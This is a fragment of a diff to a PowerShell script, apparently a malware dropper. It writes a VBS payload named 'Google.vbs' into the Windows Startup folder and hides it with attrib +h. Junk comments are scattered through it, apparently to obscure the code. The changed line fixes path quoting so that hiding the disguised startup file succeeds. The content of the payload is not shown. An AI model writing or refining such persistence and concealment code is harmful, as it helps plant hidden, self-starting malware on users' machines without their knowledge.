@@ -18,7 +18,7 @@ Start-Sleep -s 3
 #ugiugivugiewugigugfiuegwfgiewgucewgfiugewifugiwfg
 Set-Content -Path $env:AppData\Microsoft\Windows\'Start Menu'\Programs\Startup\Google.vbs -Value $VBS_f_ile
 #ugdsivugiuewgvgigdsuvgigugiugsdiugfiuewgifgiewugfiewgigfiwgugivwv
-attrib +h “$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\Google.vbs”
+attrib +h “$env:AppData\Microsoft\Windows\'Start Menu'\Programs\Startup\Google.vbs”
 #ugdiugviusgivgiewgugfigiewugfiuewgifgwef
 #hodhiovhsihvewofwef
 #usduvgiugdsiugfiugsugdugvgugweigfiuegwifgiwegf
